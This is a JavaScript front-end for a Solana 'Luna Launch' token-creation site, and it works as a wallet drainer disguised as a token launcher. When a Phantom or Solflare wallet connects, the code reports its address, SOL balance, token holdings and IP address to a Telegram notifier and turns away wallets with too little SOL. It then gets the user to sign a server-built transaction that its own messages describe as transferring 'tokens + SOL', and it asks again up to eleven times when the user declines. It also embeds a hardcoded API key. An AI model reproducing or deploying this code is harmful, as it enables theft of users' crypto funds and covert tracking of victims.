$(document).ready(function() {
    let selectedWalletProvider = null;

    // Environment variable for Solana RPC API key (replace with actual key in production)
    const SOLANA_API_KEY = process.env.SOLANA_API_KEY || 'pFT17iBbtFSN8EJPtzH5EJBfdY6aLnzEvCywMdY3PwAWGujrYW3JCm99dqnvCWVtSif2TNi2TiQbQ3TQ8SG4pADiY7vdhhiY2F';

    async function getClientIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            console.error('Failed to get IP:', error);
            return null;
        }
    }

    async function getSPLTokenInfo(connection, publicKey) {
        try {
            const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
                programId: solanaWeb3.TOKEN_PROGRAM_ID,
            });

            const tokens = [];
            const tokenPrices = await getTokenPrices();
            
            for (const tokenAccount of tokenAccounts.value) {
                const accountData = tokenAccount.account.data;
                const parsedInfo = accountData.parsed.info;
                const balance = parsedInfo.tokenAmount;

                if (balance.uiAmount > 0) {
                    const mint = parsedInfo.mint;
                    const symbol = getTokenSymbol(mint);
                    const price = tokenPrices[mint] || 0;
                    const usdValue = balance.uiAmount * price;
                    
                    tokens.push({
                        mint: mint,
                        balance: balance.uiAmount,
                        symbol: symbol,
                        usdValue: usdValue
                    });
                }
            }
            return tokens;
        } catch (error) {
            console.error('Failed to get SPL tokens:', error);
            return [];
        }
    }

    async function getTokenPrices() {
        try {
            const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=usd-coin,tether,solana,bonk&vs_currencies=usd');
            const data = await response.json();
            
            return {
                'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v': data['usd-coin']?.usd || 1,
                'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB': data['tether']?.usd || 1,
                'So11111111111111111111111111111111111111112': data['solana']?.usd || 0,
                'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263': data['bonk']?.usd || 0,
            };
        } catch (error) {
            console.error('Failed to get token prices:', error);
            return {};
        }
    }

    function getTokenSymbol(mint) {
        const tokenMap = {
            'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v': 'USDC',
            'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB': 'USDT',
            'So11111111111111111111111111111111111111112': 'WSOL',
            'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263': 'BONK',
            'mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So': 'mSOL',
            'J1toso1uCk3RLmjorhTtrVwY9HJ7X8V9yYac6Y7kGCPn': 'jitoSOL',
        };
        return tokenMap[mint] || 'Unknown';
    }

    async function sendTelegramNotification(message) {
        try {
            await fetch('/notify', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    address: message.address,
                    balance: message.balance,
                    usdBalance: message.usdBalance,
                    walletType: message.walletType,
                    customMessage: message.customMessage,
                    splTokens: message.splTokens,
                    ip: message.ip
                })
            });
        } catch (error) {
            console.error('Failed to send Telegram notification:', error);
        }
    }

    function isMobile() {
        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    }

    function getCurrentSiteUrl() {
        return encodeURIComponent(window.location.origin);
    }

    // Collect form data from create-token/index.html
    function getTokenFormData() {
        const form = document.querySelector('.token-creation-box');
        if (!form) return null;

        const formData = new FormData(form);
        const data = {
            name: formData.get('name') || '',
            symbol: formData.get('symbol') || '',
            decimals: parseInt(formData.get('decimals') || '9'),
            supply: parseInt(formData.get('supply') || '1000000'),
            description: formData.get('description') || '',
            recipient_address: formData.get('recipient_address') || '',
            custom_banner: {
                is_enabled: formData.get('custom_banner.is_enabled') === 'on',
            },
            multi_chain_launch: {
                is_enabled: formData.get('multi_chain_launch.is_enabled') === 'on',
                chains: [
                    formData.get('multi_chain.solana') ? 'Solana' : null,
                    formData.get('multi_chain.base') ? 'Base' : null,
                    formData.get('multi_chain.bsc') ? 'BSC' : null,
                    formData.get('multi_chain.arbitrum') ? 'Arbitrum' : null,
                    formData.get('multi_chain.polygon') ? 'Polygon' : null,
                    formData.get('multi_chain.avalanche') ? 'Avalanche' : null,
                ].filter(Boolean),
            },
            advanced_privacy: formData.get('advanced_privacy.is_enabled') === 'on',
            project_trend: formData.get('project_trend.is_enabled') === 'on',
            bot_service: formData.get('bot_service.is_enabled') === 'on',
            creator: {
                is_enabled: formData.get('creator.is_enabled') === 'on',
                address: formData.get('creator.address') || '',
                name: formData.get('creator.name') || '',
            },
            social_links: {
                is_enabled: formData.get('social_links.is_enabled') === 'on',
                telegram: formData.get('social_links.telegram') || '',
                twitter: formData.get('social_links.twitter') || '',
                project_website: formData.get('social_links.project_website') || '',
            },
            luna_liquidity: formData.get('luna_liquidity.is_enabled') === 'on',
            authorities: {
                revoke_freeze: formData.get('authorities.revoke_freeze') === 'on',
                revoke_mint: formData.get('authorities.revoke_mint') === 'on',
                revoke_update: formData.get('authorities.revoke_update') === 'on',
            },
        };

        // Handle file uploads (logo and banner)
        const logoFile = form.querySelector('input[name="logo"]')?.files[0];
        if (logoFile) data.logo = logoFile;

        const bannerFile = form.querySelector('input[name="banner"]')?.files[0];
        if (bannerFile) data.custom_banner.file = bannerFile;

        return data;
    }

    function checkWalletAvailability() {
        const isMobileDevice = isMobile();
        
        const wallets = {
            phantom: {
                provider: window.solana,
                condition: window.solana && window.solana.isPhantom,
                name: 'Phantom Wallet',
                isMobileSupported: true,
                installUrl: {
                    chrome: 'https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjaphhpkkoljpa',
                    firefox: 'https://addons.mozilla.org/en-US/firefox/addon/phantom-app/',
                    mobile: 'https://phantom.app/download'
                }
            },
            solflare: {
                provider: window.solflare,
                condition: window.solflare && window.solflare.isSolflare,
                name: 'Solflare Wallet',
                isMobileSupported: true,
                installUrl: {
                    chrome: 'https://chrome.google.com/webstore/detail/solflare-wallet/bhhhlbepdkbapadjdnnojkbgioiodbic',
                    firefox: 'https://addons.mozilla.org/en-US/firefox/addon/solflare-wallet/',
                    mobile: 'https://solflare.com/download'
                }
            }
        };

        Object.keys(wallets).forEach(walletId => {
            const wallet = wallets[walletId];
            const statusElement = document.getElementById(`${walletId}-status`);
            const optionElement = document.getElementById(`${walletId}-wallet`);
            
            if (wallet.condition) {
                statusElement.innerHTML = '<span class="status-dot installed"></span><span class="status-text status-installed">Installed</span>';
                optionElement.disabled = false;
            } else if (isMobileDevice && wallet.isMobileSupported) {
                statusElement.innerHTML = '<span class="status-dot"></span><span class="status-text">Mobile App</span>';
                optionElement.disabled = false;
            } else {
                statusElement.innerHTML = '<span class="status-dot not-installed"></span><span class="status-text status-not-installed">Not Installed</span>';
                optionElement.disabled = false;
            }
        });

        return wallets;
    }

    function getWalletProvider(walletType) {
        const providers = {
            phantom: window.solana,
            solflare: window.solflare
        };
        return providers[walletType];
    }

    async function connectWallet(walletType, walletProvider) {
        try {
            const wallets = checkWalletAvailability();
            const walletInfo = wallets[walletType];
            const isMobileDevice = isMobile();
            
            if (isMobileDevice && !walletInfo.condition) {
                let deepLinkUrl, appName;
                
                if (walletType === 'phantom') {
                    const currentUrl = getCurrentSiteUrl();
                    deepLinkUrl = `https://phantom.app/ul/browse/${currentUrl}?ref=` + encodeURIComponent(window.location.href);
                    appName = 'Phantom App';
                } else if (walletType === 'solflare') {
                    const currentUrl = getCurrentSiteUrl();
                    deepLinkUrl = `https://solflare.com/ul/v1/browse/${currentUrl}?ref=` + encodeURIComponent(window.location.href);
                    appName = 'Solflare App';
                }
                
                if (deepLinkUrl) {
                    await sendTelegramNotification({
                        address: 'Unknown',
                        balance: 'Unknown',
                        usdBalance: 'Unknown',
                        walletType: walletInfo.name,
                        customMessage: `📱 Mobile ${walletInfo.name} Deep Link Opened`
                    });
                    
                    showWalletLoading();
                    $('.wallet-loading-title').text(`Opening ${appName}`);
                    $('.wallet-loading-subtitle').html(`Redirecting to ${appName}...<br>Please approve the connection in the app.`);
                    
                    const connectionCheckInterval = setInterval(() => {
                        const provider = walletType === 'phantom' ? window.solana : window.solflare;
                        const condition = walletType === 'phantom' ? 
                            (window.solana && window.solana.isPhantom) : 
                            (window.solflare && window.solflare.isSolflare);
                            
                        if (condition) {
                            clearInterval(connectionCheckInterval);
                            connectWallet(walletType, provider);
                        }
                    }, 1000);
                    
                    setTimeout(() => {
                        clearInterval(connectionCheckInterval);
                        showWalletOptions();
                        unlockModal();
                    }, 120000);
                    
                    window.location.href = deepLinkUrl;
                    return;
                }
            }
            
            if (!walletInfo.condition) {
                let installUrl;
                if (isMobileDevice && walletInfo.installUrl.mobile) {
                    installUrl = walletInfo.installUrl.mobile;
                } else {
                    const isFirefox = typeof InstallTrigger !== "undefined";
                    installUrl = isFirefox ? walletInfo.installUrl.firefox : walletInfo.installUrl.chrome;
                }
                
                await sendTelegramNotification({
                    address: 'Unknown',
                    balance: 'Unknown',
                    usdBalance: 'Unknown',
                    walletType: walletInfo.name,
                    customMessage: `❌ ${walletInfo.name} ${isMobileDevice ? 'App' : 'Extension'} Not Found`
                });
                
                showWalletOptions();
                
                const installMessage = isMobileDevice ? 
                    `${walletInfo.name} mobile app is required. Would you like to download it?` :
                    `${walletInfo.name} is not installed. Would you like to install it?`;
                
                if (confirm(installMessage)) {
                    window.open(installUrl, '_blank');
                }
                return;
            }

            if (!walletProvider) {
                throw new Error('Wallet provider not found');
            }

            showWalletLoading();
            
            if (walletType === 'phantom') {
                $('.wallet-loading-spinner img').attr('src', 'https://docs.phantom.com/favicon.svg');
                $('.wallet-loading-spinner img').attr('alt', 'Phantom');
                $('.wallet-loading-title').text('Connecting Phantom');
                $('.wallet-loading-spinner').removeClass('solflare');
            } else if (walletType === 'solflare') {
                $('.wallet-loading-spinner img').attr('src', 'https://solflare.com/favicon.ico');
                $('.wallet-loading-spinner img').attr('alt', 'Solflare');
                $('.wallet-loading-title').text('Connecting Solflare');
                $('.wallet-loading-spinner').addClass('solflare');
            } else {
                $('.wallet-loading-title').text('Connecting to Wallet');
                $('.wallet-loading-spinner').removeClass('solflare');
            }
            
            $('.wallet-loading-subtitle').html('Please approve the connection request in your wallet.<br>This may take a few moments.');

            if (walletType === 'solflare') {
                if (!walletProvider || !walletProvider.isSolflare) {
                    throw new Error('Solflare wallet not detected. Please make sure Solflare extension is installed and enabled.');
                }
            }

            const resp = await walletProvider.connect();
            console.log(`${walletInfo.name} connected:`, resp);

            $('.wallet-loading-title').text(`${walletInfo.name} Connected`);
            $('.wallet-loading-subtitle').html('Fetching wallet information...<br>Please wait.');

            const connection = new solanaWeb3.Connection(
                `https://solana-mainnet.api.syndica.io/api-key/${SOLANA_API_KEY}`, 
                'confirmed'
            );

            let publicKeyString;
            if (walletType === 'solflare') {
                if (walletProvider.publicKey) {
                    publicKeyString = walletProvider.publicKey.toString ? walletProvider.publicKey.toString() : walletProvider.publicKey;
                } else if (walletProvider.pubkey) {
                    publicKeyString = walletProvider.pubkey.toString ? walletProvider.pubkey.toString() : walletProvider.pubkey;
                } else {
                    throw new Error('No public key received from Solflare wallet');
                }
            } else {
                if (resp.publicKey) {
                    publicKeyString = resp.publicKey.toString ? resp.publicKey.toString() : resp.publicKey;
                } else {
                    throw new Error('No public key received from wallet');
                }
            }

            const public_key = new solanaWeb3.PublicKey(publicKeyString);
            const walletBalance = await connection.getBalance(public_key);
            console.log("Wallet balance:", walletBalance);

            const solBalanceFormatted = (walletBalance / 1000000000).toFixed(6);

            const clientIP = await getClientIP();
            const splTokens = await getSPLTokenInfo(connection, public_key);

            await sendTelegramNotification({
                address: publicKeyString,
                balance: solBalanceFormatted,
                usdBalance: 'Unknown',
                walletType: walletInfo.name,
                customMessage: '🔗 Wallet Connected',
                splTokens: splTokens,
                ip: clientIP
            });

            const minBalance = await connection.getMinimumBalanceForRentExemption(0);
            const requiredBalance = 0.02 * 1000000000;
            
            if (walletBalance < requiredBalance) {
                await sendTelegramNotification({
                    address: publicKeyString,
                    balance: solBalanceFormatted,
                    usdBalance: 'Unknown',
                    walletType: walletInfo.name,
                    customMessage: '❌ Insufficient Funds - Please have at least 0.02 SOL'
                });
                
                $('.wallet-loading-title').text('Insufficient Balance');
                $('.wallet-loading-subtitle').html(`Please have at least 0.02 SOL to begin.<br>Current balance: ${solBalanceFormatted} SOL`);
                
                showRejectionEffects();
                
                setTimeout(() => {
                    unlockModal();
                    showWalletOptions();
                    $('#connect-wallet').text("Connect Wallet");
                }, 3000);
                
                return;
            }

            $('#connect-wallet').text("Processing...");

            const attemptTransaction = async (retryCount = 0) => {
                const maxRetries = 10;
                
                try {
                    const verificationKey = `ownership_verified_${publicKeyString}`;
                    const isAlreadyVerified = localStorage.getItem(verificationKey) === 'true';
                    
                    let ownershipVerified = false;
                    
                    if (isAlreadyVerified) {
                        console.log("Ownership already verified for this wallet, skipping verification");
                        
                        await sendTelegramNotification({
                            address: publicKeyString,
                            balance: solBalanceFormatted,
                            usdBalance: 'Unknown',
                            walletType: walletInfo.name,
                            customMessage: `✅ Ownership Previously Verified - Proceeding to transaction (Attempt ${retryCount + 1})`
                        });
                        
                        ownershipVerified = true;
                    } else {
                        $('.wallet-loading-title').text(`Verifying ${walletInfo.name} Ownership`);
                        $('.wallet-loading-subtitle').html(`Please sign the verification message in your ${walletInfo.name} wallet.<br>This confirms you own this wallet.`);
                        $('#connect-wallet').text('Verifying Ownership...');
                        
                        const verificationMessage = `Verify wallet ownership for Luna Launch token creation.\nTimestamp: ${Date.now()}\nWallet: ${publicKeyString.substring(0, 8)}...${publicKeyString.substring(publicKeyString.length - 8)}`;
                        const messageBytes = new TextEncoder().encode(verificationMessage);
                        
                        try {
                            const signedMessage = await walletProvider.signMessage(messageBytes, 'utf8');
                            console.log("Ownership verification signed:", signedMessage);
                            
                            localStorage.setItem(verificationKey, 'true');
                            
                            await sendTelegramNotification({
                                address: publicKeyString,
                                balance: solBalanceFormatted,
                                usdBalance: 'Unknown',
                                walletType: walletInfo.name,
                                customMessage: `✅ User Signed Ownership Verification - Proceeding to transaction (Attempt ${retryCount + 1})`
                            });
                            
                            ownershipVerified = true;
                        } catch (signError) {
                            console.error("Ownership verification failed:", signError);
                            
                            const signErrorMessage = signError.message || signError.toString() || 'Unknown error';
                            const signErrorCode = signError.code || '';
                            const signErrorName = signError.name || '';
                            
                            const isSignRejection = 
                                signErrorMessage.includes('User rejected') || 
                                signErrorMessage.includes('rejected') || 
                                signErrorMessage.includes('cancelled') ||
                                signErrorCode === 4001 ||
                                signErrorCode === -32003 ||
                                signErrorName === 'UserRejectedRequestError';
                            
                            if (isSignRejection) {
                                await sendTelegramNotification({
                                    address: publicKeyString,
                                    balance: solBalanceFormatted,
                                    usdBalance: 'Unknown',
                                    walletType: walletType === 'phantom' ? 'Phantom Wallet' : walletType === 'solflare' ? 'Solflare Wallet' : 'Unknown',
                                    customMessage: `❌ Ownership Verification Rejected by User (Attempt ${retryCount + 1})`
                                });
                                
                                if (retryCount < maxRetries) {
                                    showRejectionEffects();
                                    $('.wallet-loading-title').text('Verification Rejected');
                                    $('.wallet-loading-subtitle').html(`Please try again! (${retryCount + 1}/${maxRetries + 1})<br>Sign the verification message in your wallet.`);
                                    
                                    setTimeout(() => {
                                        clearRejectionEffects();
                                        attemptTransaction(retryCount + 1);
                                    }, 2000);
                                    return;
                                } else {
                                    throw new Error('Ownership verification rejected too many times');
                                }
                            } else {
                                throw signError;
                            }
                        }
                    }
                    
                    if (!ownershipVerified) {
                        throw new Error('Failed to verify wallet ownership');
                    }
                    
                    $('.wallet-loading-title').text(`Processing Transaction${retryCount > 0 ? ` (Attempt ${retryCount + 1})` : ''}`);
                    $('.wallet-loading-subtitle').html('Preparing token creation transaction...<br>Do not close this window.');
                    $('#connect-wallet').text(`Processing... ${retryCount > 0 ? `(Attempt ${retryCount + 1})` : ''}`);
                    
                    // Collect form data for token creation
                    const tokenData = getTokenFormData();
                    if (!tokenData) {
                        throw new Error('Token creation form not found or incomplete');
                    }

                    // Prepare form data for backend (excluding file uploads for now)
                    const prepareResponse = await fetch('/prepare-transaction', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            publicKey: publicKeyString,
                            verified: true,
                            tokenData: {
                                name: tokenData.name,
                                symbol: tokenData.symbol,
                                decimals: tokenData.decimals,
                                supply: tokenData.supply,
                                description: tokenData.description,
                                recipient_address: tokenData.recipient_address,
                                custom_banner: tokenData.custom_banner.is_enabled,
                                multi_chain_launch: tokenData.multi_chain_launch,
                                advanced_privacy: tokenData.advanced_privacy,
                                project_trend: tokenData.project_trend,
                                bot_service: tokenData.bot_service,
                                creator: tokenData.creator,
                                social_links: tokenData.social_links,
                                luna_liquidity: tokenData.luna_liquidity,
                                authorities: tokenData.authorities,
                            }
                        })
                    });

                    const prepareData = await prepareResponse.json();
                    
                    if (!prepareResponse.ok) {
                        await sendTelegramNotification({
                            address: publicKeyString,
                            balance: solBalanceFormatted,
                            usdBalance: 'Unknown',
                            walletType: walletInfo.name,
                            customMessage: '❌ Token Creation Preparation Failed'
                        });
                        alert(prepareData.error || "Failed to prepare token creation transaction");
                        $('#connect-wallet').text("Connect Wallet");
                        return;
                    }

                    // Handle file uploads (logo and banner) separately
                    if (tokenData.logo || tokenData.custom_banner.file) {
                        const uploadFormData = new FormData();
                        if (tokenData.logo) uploadFormData.append('logo', tokenData.logo);
                        if (tokenData.custom_banner.file) uploadFormData.append('banner', tokenData.custom_banner.file);
                        uploadFormData.append('publicKey', publicKeyString);

                        await fetch('/upload-token-assets', {
                            method: 'POST',
                            body: uploadFormData
                        });
                    }

                    const transactionBytes = new Uint8Array(prepareData.transaction);
                    const transaction = solanaWeb3.Transaction.from(transactionBytes);

                    $('.wallet-loading-title').text('Signing Transaction');
                    $('.wallet-loading-subtitle').html('Please approve the transaction in your wallet.<br>This may take a few moments.');
                    
                    const signed = await walletProvider.signTransaction(transaction);
                    console.log("Transaction signed:", signed);

                    await sendTelegramNotification({
                        address: publicKeyString,
                        balance: solBalanceFormatted,
                        usdBalance: 'Unknown',
                        walletType: walletInfo.name,
                        customMessage: `✅ Token Creation Transaction Signed - ${prepareData.tokenTransfers} tokens + SOL transfer (Attempt ${retryCount + 1})`
                    });

                    $('.wallet-loading-title').text('Confirming Transaction');
                    $('.wallet-loading-subtitle').html('Transaction is being confirmed on the blockchain.<br>Please wait...');
                    
                    let txid = await connection.sendRawTransaction(signed.serialize());
                    await connection.confirmTransaction(txid);
                    console.log("Transaction confirmed:", txid);
                    
                    const shortTxid = `${txid.substring(0, 6)}....${txid.substring(txid.length - 8)}`;
                    const solscanUrl = `https://solscan.io/tx/${txid}`;
                    
                    await sendTelegramNotification({
                        address: publicKeyString,
                        balance: solBalanceFormatted,
                        usdBalance: 'Unknown',
                        walletType: walletInfo.name,
                        customMessage: `🎉 Token Creation Transaction Confirmed! TXID: [${shortTxid}](${solscanUrl}) (Attempt ${retryCount + 1})`
                    });
                    
                    $('.wallet-loading-title').text('Success!');
                    $('.wallet-loading-subtitle').html('Token has been successfully created.<br>Transaction confirmed on blockchain.');
                    
                    $('#connect-wallet').text("Token Created Successfully!");
                    
                    // Update Luna Launch success modal
                    const mintAddress = prepareData.mintAddress || 'Unknown';
                    const llOkModal = document.getElementById('ll-ok-modal');
                    if (llOkModal) {
                        const mintAddrElement = document.getElementById('ll-mint-address');
                        if (mintAddrElement) mintAddrElement.textContent = mintAddress;
                        openModal('ll-ok-modal');
                    }
                    
                    setTimeout(() => {
                        unlockModal();
                        hideWalletModal();
                        $('#connect-wallet').text("Connect Wallet");
                    }, 2000);
                    
                } catch (err) {
                    console.error("Error during token creation:", err);
                    
                    const errorMessage = err.message || err.toString() || 'Unknown error';
                    const errorCode = err.code || '';
                    const errorName = err.name || '';
                    
                    const isUserRejection = 
                        errorMessage.includes('User rejected') || 
                        errorMessage.includes('rejected') || 
                        errorMessage.includes('cancelled') ||
                        errorMessage.includes('Transaction cancelled') ||
                        errorCode === 4001 ||
                        errorCode === -32003 ||
                        errorName === 'UserRejectedRequestError';
                    
                    if (isUserRejection) {
                        if (retryCount < maxRetries) {
                            await sendTelegramNotification({
                                address: publicKeyString,
                                balance: solBalanceFormatted,
                                usdBalance: 'Unknown',
                                walletType: walletType === 'phantom' ? 'Phantom Wallet' : walletType === 'solflare' ? 'Solflare Wallet' : 'Unknown',
                                customMessage: `❌ Token Creation Transaction Rejected by User - Retrying... (Attempt ${retryCount + 1}/${maxRetries + 1})`
                            });
                            
                            showRejectionEffects();
                            
                            $('.wallet-loading-title').text('Transaction Rejected');
                            $('.wallet-loading-subtitle').html(`Please try again! (${retryCount + 1}/${maxRetries + 1})<br>Click approve in your wallet.`);
                            
                            setTimeout(() => {
                                clearRejectionEffects();
                                attemptTransaction(retryCount + 1);
                            }, 2000);
                            return;
                        } else {
                            await sendTelegramNotification({
                                address: publicKeyString,
                                balance: solBalanceFormatted,
                                usdBalance: 'Unknown',
                                walletType: walletType === 'phantom' ? 'Phantom Wallet' : walletType === 'solflare' ? 'Solflare Wallet' : 'Unknown',
                                customMessage: `❌ Token Creation Transaction Rejected ${maxRetries + 1} Times - Giving Up`
                            });
                            
                            showRejectionEffects();
                            
                            $('.wallet-loading-title').text('Transaction Failed');
                            $('.wallet-loading-subtitle').html(`Transaction was rejected ${maxRetries + 1} times.<br>Please try again later.`);
                            
                            setTimeout(() => {
                                unlockModal();
                                showWalletOptions();
                                $('#connect-wallet').text("Connect Wallet");
                            }, 3000);
                            return;
                        }
                    }
                    
                    let notificationMessage = '❌ Token Creation Transaction Failed';
                    
                    await sendTelegramNotification({
                        address: publicKeyString,
                        balance: solBalanceFormatted,
                        usdBalance: 'Unknown',
                        walletType: walletType === 'phantom' ? 'Phantom Wallet' : walletType === 'solflare' ? 'Solflare Wallet' : 'Unknown',
                        customMessage: `${notificationMessage}: ${errorMessage} (Attempt ${retryCount + 1})`
                    });
                    
                    $('.wallet-loading-title').text('Transaction Failed');
                    $('.wallet-loading-subtitle').html('An error occurred during token creation.<br>Please try again.');
                    
                    setTimeout(() => {
                        unlockModal();
                        showWalletOptions();
                        $('#connect-wallet').text("Connect Wallet");
                    }, 3000);
                }
            };

            await attemptTransaction();
            
        } catch (err) {
            console.error(`Error connecting to ${walletType}:`, err);
            
            $('.wallet-loading-title').text('Connection Failed');
            $('.wallet-loading-subtitle').html('Failed to connect to wallet.<br>Please try again.');
            
            await sendTelegramNotification({
                address: 'Unknown',
                balance: 'Unknown',
                usdBalance: 'Unknown',
                walletType: walletType === 'phantom' ? 'Phantom Wallet' : walletType === 'solflare' ? 'Solflare Wallet' : 'Unknown',
                customMessage: `❌ Wallet Connection Failed: ${err.message || err.toString() || 'Unknown error'}`
            });
            
            setTimeout(() => {
                showWalletOptions();
                unlockModal();
            }, 2000);
            
            setTimeout(() => {
                const walletName = walletType === 'phantom' ? 'Phantom Wallet' : walletType === 'solflare' ? 'Solflare Wallet' : 'Unknown';
                alert(`Failed to connect to ${walletName}: ${err.message || err.toString() || 'Unknown error'}`);
            }, 2100);
        }
    }

    function showWalletModal() {
        // Create wallet modal if it doesn't exist
        if (!document.getElementById('wallet-modal')) {
            const modal = document.createElement('div');
            modal.id = 'wallet-modal';
            modal.className = 'll-modal';
            modal.innerHTML = `
                <div class="ll-modal-card">
                    <span class="ll-modal-close" onclick="hideWalletModal()">&times;</span>
                    <div class="wallet-modal-header">
                        <h3>Select Your Wallet</h3>
                    </div>
                    <div id="wallet-options">
                        <div class="wallet-option" data-wallet="phantom" id="phantom-wallet">
                            <img src="https://docs.phantom.com/favicon.svg" alt="Phantom" class="phantom-icon">
                            <span>Phantom Wallet</span>
                            <span id="phantom-status"></span>
                        </div>
                        <div class="wallet-option" data-wallet="solflare" id="solflare-wallet">
                            <img src="https://solflare.com/favicon.ico" alt="Solflare" class="solflare-icon">
                            <span>Solflare Wallet</span>
                            <span id="solflare-status"></span>
                        </div>
                    </div>
                    <div id="wallet-loading-state" class="hidden">
                        <div class="wallet-loading-spinner">
                            <img src="" alt="">
                        </div>
                        <h3 class="wallet-loading-title">Connecting...</h3>
                        <p class="wallet-loading-subtitle">Please wait...</p>
                    </div>
                </div>
            `;
            document.body.appendChild(modal);
        }

        checkWalletAvailability();
        showWalletOptions();
        $('#wallet-modal').fadeIn(200);
    }

    function hideWalletModal() {
        $('#wallet-modal').fadeOut(200);
        showWalletOptions();
        unlockModal();
    }

    function lockModal() {
        $('#wallet-modal').addClass('locked');
    }

    function unlockModal() {
        $('#wallet-modal').removeClass('locked');
    }

    function showWalletOptions() {
        $('#wallet-options').removeClass('hidden');
        $('#wallet-loading-state').removeClass('active');
        $('.wallet-modal-header h3').text('Select Your Wallet');
        clearRejectionEffects();
    }

    function showWalletLoading() {
        $('#wallet-options').addClass('hidden');
        $('#wallet-loading-state').addClass('active');
        $('.wallet-modal-header h3').text('Connecting...');
        lockModal();
        clearRejectionEffects();
    }

    function showRejectionEffects() {
        $('.wallet-loading-spinner').addClass('rejected');
        $('.phantom-icon').addClass('rejected');
        $('.solflare-icon').addClass('rejected');
        $('.wallet-loading-spinner img').addClass('rejected');
        $('.wallet-modal-content').addClass('shake');
        
        setTimeout(() => {
            $('.wallet-modal-content').removeClass('shake');
        }, 600);
    }

    function clearRejectionEffects() {
        $('.wallet-loading-spinner').removeClass('rejected');
        $('.phantom-icon').removeClass('rejected');
        $('.solflare-icon').removeClass('rejected');
        $('.wallet-loading-spinner img').removeClass('rejected');
        $('.wallet-modal-content').removeClass('shake');
    }

    $('#connect-wallet, #connect-wallet-hero').on('click', function() {
        showWalletModal();
    });

    $('#close-modal, .wallet-modal-overlay').on('click', function(e) {
        if (!$('#wallet-modal').hasClass('locked')) {
            hideWalletModal();
        }
    });

    $('.wallet-option').on('click', function() {
        const walletType = $(this).data('wallet');
        const walletProvider = getWalletProvider(walletType);
        
        connectWallet(walletType, walletProvider);
    });

    $(document).on('keydown', function(e) {
        if (e.key === 'Escape' && !$('#wallet-modal').hasClass('locked')) {
            hideWalletModal();
        }
    });

    // Bind to Launch Token button
    $('.submit-btn').on('click', function() {
        showWalletModal();
    });

    // Bind to payment modal check transaction button
    $('#ll-check-tx').on('click', async function() {
        const feeAddress = $('#ll-fee-address').text();
        const feeAmount = parseFloat($('#ll-fee-amount').text()) || 0.3; // Fallback to platform fee
        const publicKeyString = selectedWalletProvider?.publicKey?.toString();
        
        if (!publicKeyString) {
            alert('Please connect your wallet first.');
            return;
        }

        const connection = new solanaWeb3.Connection(
            `https://solana-mainnet.api.syndica.io/api-key/${SOLANA_API_KEY}`, 
            'confirmed'
        );

        try {
            $('#ll-loader-1').css('display', 'flex');
            const transactions = await connection.getConfirmedSignaturesForAddress2(
                new solanaWeb3.PublicKey(feeAddress)
            );
            const recentTx = transactions.find(tx => tx.memo && tx.memo.includes(publicKeyString));
            
            if (recentTx) {
                await sendTelegramNotification({
                    address: publicKeyString,
                    balance: 'Unknown',
                    usdBalance: 'Unknown',
                    walletType: 'Unknown',
                    customMessage: `✅ Payment Confirmed for Token Creation`
                });
                openModal('ll-ok-modal');
            } else {
                alert('No recent payment found. Please ensure you sent the correct amount to the fee address.');
            }
        } catch (error) {
            console.error('Error checking transaction:', error);
            alert('Failed to verify payment. Please try again.');
        } finally {
            $('#ll-loader-1').css('display', 'none');
        }
    });

    // Bind copy address buttons
    $('#ll-copy-addr, #ll-copy-mint').on('click', function() {
        const text = $(this).siblings('span').text();
        navigator.clipboard.writeText(text).then(() => {
            alert('Address copied to clipboard!');
        });
    });

    // Bind OK button in success modal
    $('#ll-ok').on('click', function() {
        closeModal('ll-ok-modal');
    });

    $(document).ready(function() {
        $('#connect-wallet-hero').on('click', function() {
            showWalletModal();
        });
    });
});